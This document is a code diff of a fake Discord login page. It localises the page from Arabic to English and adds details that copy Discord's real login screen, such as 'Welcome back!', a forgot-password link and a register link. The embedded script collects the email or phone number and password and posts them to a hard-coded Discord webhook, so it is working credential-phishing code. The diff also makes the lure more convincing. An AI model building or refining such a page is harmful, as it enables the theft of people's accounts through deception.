@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Discord Login with Webhook</title>
+  <title>Discord Login</title>
   <style>
     body {
       margin: 0;
@@ -10,7 +10,6 @@
       background: url("1000201800.jpg") no-repeat center center fixed;
       background-size: cover;
       color: #fff;
-      direction: rtl;
     }
 
     .logo {
@@ -42,14 +41,19 @@
       margin: 0 0 10px;
     }
 
+    .form-section p {
+      margin: 0 0 20px;
+      color: #b9bbbe;
+      font-size: 14px;
+    }
+
     label {
       display: block;
       margin-bottom: 5px;
       font-size: 14px;
-      font-weight: bold;
     }
 
-    input[type="email"], input[type="password"], input[type="text"] {
+    input {
       width: 100%;
       padding: 10px;
       margin-bottom: 15px;
@@ -63,13 +67,24 @@
     .consent-label {
       font-weight: normal;
       margin-bottom: 15px;
+      color: #b9bbbe;
       display: flex;
       align-items: center;
+      font-size: 14px;
     }
 
     .consent-label input[type="checkbox"] {
-      margin-left: 10px;
+      margin-right: 10px;
       transform: scale(1.2);
+      cursor: pointer;
+    }
+
+    .forgot {
+      display: block;
+      margin-bottom: 15px;
+      font-size: 13px;
+      color: #00aff4;
+      text-decoration: none;
     }
 
     button {
@@ -81,6 +96,17 @@
       color: white;
       font-size: 15px;
       cursor: pointer;
+    }
+
+    .register {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #b9bbbe;
+    }
+
+    .register a {
+      color: #00aff4;
+      text-decoration: none;
     }
 
     .qr-section {
@@ -115,21 +141,27 @@
 
   <div class="login-container">
     <div class="form-section">
-      <h2>أدخل بيانات ديسكورد الخاصة بك</h2>
+      <h2>Welcome back!</h2>
+      <p>We're so excited to see you again!</p>
       <form id="discordForm">
-        <label for="discord_email">إيميل الديسكورد:</label>
-        <input type="email" id="discord_email" required />
+        <label for="email">Email or Phone Number <span style="color:red">*</span></label>
+        <input type="text" id="email" required />
 
-        <label for="password">كلمة السر:</label>
+        <label for="password">Password <span style="color:red">*</span></label>
         <input type="password" id="password" required />
 
         <label class="consent-label">
           <input type="checkbox" id="consent" required />
-          أوافق على مشاركة المعلومات
+          I agree to share my information
         </label>
 
-        <button type="submit">إرسال</button>
+        <a href="#" class="forgot">Forgot your password?</a>
+
+        <button type="submit">Log In</button>
       </form>
+      <div class="register">
+        Need an account? <a href="#">Register</a>
+      </div>
     </div>
 
     <div class="qr-section">
@@ -143,26 +175,27 @@
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1364438803170725899/9Zrvq7SXUIUIE8VEdazpPYtyc1qwDmaJufck8dEfC2w0xbc5TVktfzrb6vUJnPasaqDb";
 
-    document.getElementById('discordForm').addEventListener('submit', function(event) {
+    const form = document.getElementById('discordForm');
+    form.addEventListener('submit', function(event) {
       event.preventDefault();
 
-      const email = document.getElementById('discord_email').value.trim();
+      const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value.trim();
       const consent = document.getElementById('consent').checked;
 
       if (!consent) {
-        alert("يجب الموافقة على مشاركة المعلومات");
+        alert("You must agree to share your information");
         return;
       }
 
       const message = {
         embeds: [
           {
-            title: "تم استلام بيانات جديدة من الموقع",
+            title: "New data received from the website",
             color: 7506394,
             fields: [
-              { name: "إيميل الديسكورد", value: email, inline: false },
-              { name: "كلمة السر", value: password, inline: false }
+              { name: "Email or Phone Number", value: email || "N/A", inline: false },
+              { name: "Password", value: password || "N/A", inline: false }
             ],
             timestamp: new Date().toISOString()
           }
@@ -171,21 +204,19 @@
 
       fetch(webhookURL, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(message)
       })
       .then(response => {
         if (response.ok) {
-          alert('تم الإرسال بنجاح!');
-          this.reset();
+          alert('Sent successfully!');
+          form.reset();
         } else {
-          alert('فشل الإرسال، حاول مرة أخرى لاحقاً.');
+          alert('Failed to send, please try again later.');
         }
       })
       .catch(error => {
-        alert('خطأ في الاتصال: ' + error.message);
+        alert('Connection error: ' + error.message);
       });
     });
   </script>
